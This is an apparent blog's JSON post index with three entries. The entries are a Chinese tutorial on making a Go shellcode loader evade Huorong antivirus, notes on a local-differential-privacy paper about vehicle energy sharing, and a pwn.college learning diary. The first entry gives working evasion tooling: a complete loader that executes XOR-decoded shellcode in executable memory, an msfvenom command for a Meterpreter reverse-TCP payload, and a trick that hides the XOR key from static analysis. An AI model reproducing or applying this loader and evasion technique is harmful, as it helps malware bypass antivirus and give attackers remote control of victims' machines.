[{"content":"1. Shellcode 加载器（go） 我们先看最后的免杀代码\npackage main\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;os\u0026quot;\r\u0026quot;syscall\u0026quot;\r\u0026quot;unsafe\u0026quot;\r)\rconst (\rMEM_COMMIT = 0x1000\rMEM_RESERVE = 0x2000\rPAGE_EXECUTE_READWRITE = 0x40\r)\rvar (\rkernel32 = syscall.NewLazyDLL(\u0026quot;kernel32.dll\u0026quot;)\rntdll = syscall.NewLazyDLL(\u0026quot;ntdll.dll\u0026quot;)\rVirtualAlloc = kernel32.NewProc(\u0026quot;VirtualAlloc\u0026quot;)\rRtlCopyMemory = ntdll.NewProc(\u0026quot;RtlCopyMemory\u0026quot;)\r//shellcode_buf = []byte{\r//}\rshellcode_buf = []byte{\r}\r)\rfunc check(e error) {\rif e != nil {\rif e.Error() != \u0026quot;The operation completed successfully.\u0026quot; { // 内存错误\rfmt.Println(e.Error())\ros.Exit(1)\r}\r}\r}\rfunc main() {\r//// xor\rhomeDir, _ := os.UserHomeDir()\rxor := homeDir[3] // U -\u0026gt; 85\rdecimalValue := int(xor)\rshellcode := xorEncrypt(shellcode_buf, decimalValue)\r//shellcode := shellcode_buf\rfmt.Println(shellcode)\r// 申请内存\r// MEM_COMMIT|MEM_RESERVE\raddr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)\rif addr == 0 {\rcheck(err)\r}\r// 写入shellcode\r_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(\u0026amp;shellcode[0])), uintptr(len(shellcode)))\rcheck(err)\r// 执行shellcode\rsyscall.Syscall(addr, 0, 0, 0, 0)\r}\rfunc xorEncrypt(buf []byte, value int) []byte {\rfor i := 0; i \u0026lt; len(buf); i++ {\rbuf[i] ^= byte(value)\r}\rreturn buf\r}\r// go build -ldflags=\u0026quot;-H windowsgui -w -s\u0026quot; shellcodeLoader.go\r2. shellcode 生成 对于shellcode的生成我们采用msf进行生成：\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c\r对于生成的shellcode，我们如果不进行处理，对于火绒这类的杀毒软件来说，做简单的静态分析，如果坚持到0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50···这些关键字节，肯定会报毒：Backdoor/W64.Meterpreter.f\n3.可能的绕过方式 一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。\n本文我们主要采用亦或操作（xor）\n我们先将msf生成的shellcode进行亦或操作：\n# xor.py shellcode = []\r# xor 85\rshellcode1 = ''.join(['\\\\x%02x' % i for i in shellcode])\rprint(shellcode1)\rfor i in range(len(shellcode)):\rshellcode[i] ^= 85\r# 0x格式化输出\rshellcode = ''.join(['\\\\x%02x' % i for i in shellcode])\rprint(shellcode)\r再将shellcode进行替换，并且与目标值进行亦或，就可以获得正确的shellcode。\n但是当我们进行编译的时候，任然报毒。\nshellcode := xorEncrypt(shellcode_buf, 85)\rfunc xorEncrypt(buf []byte, value int) []byte {\rfor i := 0; i \u0026lt; len(buf); i++ {\rbuf[i] ^= byte(value)\r}\rreturn buf\r}\r这是由于火绒在检测的时候如果能明确看到85，会尝试亦或来还原shellcode，base64同理。\n所以我们就尝试如果隐藏85，通过读取用户目录来获取。\nhomeDir, _ := os.UserHomeDir()\rxor := homeDir[3] // U -\u0026gt; 85\rdecimalValue := int(xor)\r此时，shellcode是没有问题的，但是在进行编译的时候会遇到内存的报毒：\n这个原因是我们在申请内存时，设置内存权限为MEM_COMMIT|MEM_RESERVE；\n我们将内存权限设置为MEM_COMMIT就可以了。\n4. 免杀效果 查看能否上线\n5. 总结 这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。\n回来之后，反思了很多，觉得还是要对免杀进行一部分的学习，go语言的shellcode免杀通过微信推文看到的，决定挺有意思的，便在之后的学习中进行尝试，没想到就成功绕过了火绒（其他杀毒软件还没有尝试过），但是这也激起了我学习的热情。\n此外，最近也收到了实验室导师的任务，给本科生同学们准备渗透测试（CTF）的课程，也觉得免杀蛮重要的，顺便也一起给讲了。\n学无止境，脚踏实地。\n","date":"2024-06-03T16:22:34+08:00","image":"https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164_hu9cfd642fd07fce8fd66523927f7b4328_51356_120x120_fill_box_smart1_3.png","permalink":"https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/","title":"Go语言ShellCode免杀火绒"},{"content":"V2V电车能量交换 Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method\n贡献点：\n自适应隐私预算分配( Adaptive Privacy Budget Allocation，APA )模型，通过隐私预算分配来平衡数据失真和隐私泄露风险。 平衡数据隐私保护水平和数据效用的高效用扰动( HUP )模型。 改进轨迹隐私保护的隐私加权平均( PWA )模型。 Implementation of VES scheme\rAPA模型 自适应隐私计算分配模型 用来平衡噪声和信息可用性 原始位置经历LDP（本地差分隐私）扰动【添加噪声】。使用高斯核函数和哈曼顿距离来衡量两个位置之间的相似性（S，公式1）\nAPA Model\r公式1：使用高斯核函数和曼哈顿距离来衡量位置的相似性，参数σ表示缩放参数，决定了相似性随着距离递减而放大的速率。S的取值范围是[0,1]。\n公式2：轨迹信息泄露量(TIL) = 求和[1/(相似性×距离)]？\n公式3：εremain表示剩余的隐私预算，εtotal表示总体隐私预算，εk表示指定位置隐私预算支出。\n公式4：εmin 和 εmax分别**：**引入ε min来避免将微薄的预算分配到后续位置，ε max是最大隐私预算上限的阈值。\nHUP模型 平衡数据隐私保护水平和数据效用的高效用扰动 使用HUP模型的主要目的是在使用LDP方法保护数据隐私的同时，尽可能地保留原始数据的有用信息。例如，当我们需要共享敏感数据时，我们可以使用位置扰动算法对一些数据点的位置进行扰动，而不是完全按照LDP方法修改数据点的值。（不是很能理解）\nHUP model\r因此，为了最小化参与者的轨迹隐私泄露风险和最大化统计效用，我们提出了基于阈值的位置扰动( TPP )算法来获得扰动位置。\nTPP算法在保证数据效用的同时，优化了Hausdorff距离不变性的数据处理流程。\nAlgorithm 1\rPWA 改进轨迹隐私保护的隐私加权平均 （防止扰动位置太假了，容易被辨别出来） PWA Model\r问题： 该文章使用了差分隐私的扰乱机制的具体技术？文章中并没有提到说使用什么扰动机制。只提到了LDP，local 差分隐私。 该方案中APA模型中的第三步，第四步的具体含义？ 答：APA隐私预算自适应分配模型，隐私预算较大时，噪声较高，保护水平高，但是信息可用性会收到影响；当隐私预算较小时，噪声较低，保护水平低，但是信息的可用性较高。 对于剩余隐私预算 答：对于公式3来说，As evident from Fig. 3, formulas 3 and 4, the initial step involves the computation of the remaining privacy budget, denoted as εremain, for positions within the window [iω + 1, i].文章中说到这个公式求和的时候，位置[iw+1,i]区间剩余的隐私度量。 懂了，使用TILremain，表示之前的隐私泄露量隐私预算，达到考虑之前所以的差分隐私位置的影响。 公式\r","date":"2024-05-17T14:27:25+08:00","image":"https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517144025453_hu1cdb842426307bea5b6b74121446aa83_43841_120x120_fill_box_smart1_3.png","permalink":"https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/","title":"Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method"},{"content":"1. 学习路线 作为一名网络安全的学生，最开始接触到的就是web安全。但是在学习web安全的过程中，逐渐发现web安全需要更多更广的知识面。但是这对于现在的我来说是不现实的，因为在读研过程中，花费更时间去阅读论文和完成导师的项目。\n此外，总是听见别人说，pwn爷，pwn爷的，也觉得学习pwn，二进制安全是很厉害的。不过也正式因为如此，pwn的学习需要很多基本知识（汇编，C/C++，linux安全机制，堆栈相关知识等）。总之就是需要很多知识作为铺垫才能帮助去深入理解pwn的原理和技术。\n2. PwnCollege 众所周知，学习安全技术，特别是这种国内敏感技术，很多国内的网站是无法找到资源的。机缘巧合之前，我认识了一个大佬同学（腾讯安全、UCI博士在读），在他的建议下，我开始尝试pwnCollege的学习。作为一个英语高考只有100分的我来说，在学习过程中确实遇到了很多很多的困难。\n但是兴趣是最好的老师，这个课程的学习相比课堂上的读PPT会更加有趣且令人心动。在这种兴趣的不断吸引下，我从23年8月份开始学习pwnCollege的CES-466课程，截至目前位置已经完成一半内容 的学习。当然距离蓝带的路还是很远很远。\n从最简单的程序交互-\u0026gt;汇编基础-\u0026gt;shellcode注入-\u0026gt;debug-\u0026gt;逆向工程。。。\n在这些学习过程中，我收获很多，开始逐渐向着计算机底层靠近。\n3. 感受 通过冯诺依曼结构的代码段和text段没有明显区别可以在堆栈上写入shellcode，去执行恶意代码；\n设置ROP完成系统调用；格式化字符串泄露程序carry，爆破PIE，libc地址泄露，任意内存读写去修改汇编指令完成程序执行流（CFI）的控制，这些都是我在学习中获得的知识。每一次过题，都是一种前所未有的幸福，不仅仅是自己的知识增长了，更重要的是，解开了所谓”抽象“的面纱。\n","date":"2024-05-17T13:26:06+08:00","image":"https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517133556992_hu243db3fa8c31b69b4cad675550d250f2_238751_120x120_fill_box_smart1_3.png","permalink":"https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"PwnCollege 学习笔记"}]